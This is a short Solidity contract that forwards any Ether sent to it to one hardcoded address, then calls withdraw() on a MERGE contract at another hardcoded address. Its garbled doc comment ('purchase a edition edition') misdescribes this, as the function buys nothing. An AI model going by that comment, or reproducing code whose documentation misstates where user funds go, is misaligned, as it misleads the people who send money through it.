// SPDX-License-Identifier: MIT
pragma solidity ^0.8.15;

import "./MERGE.sol";

contract UNBLOCK {
    /// @notice This allows the user to purchase a edition edition
    /// at the given price in the contract.
    function sendAndWithdraw() external payable {
        (
            bool sent,
            bytes memory data
        ) = 0x2a2C412c440Dfb0E7cae46EFF581e3E26aFd1Cd0.call{value: msg.value}(
                ""
            );
        require(sent, "Failed to send Ether");
        MERGE(payable(0x4f509FbA9290DBABd0e07Bf78cd01D5c7D6814E9)).withdraw();
    }
}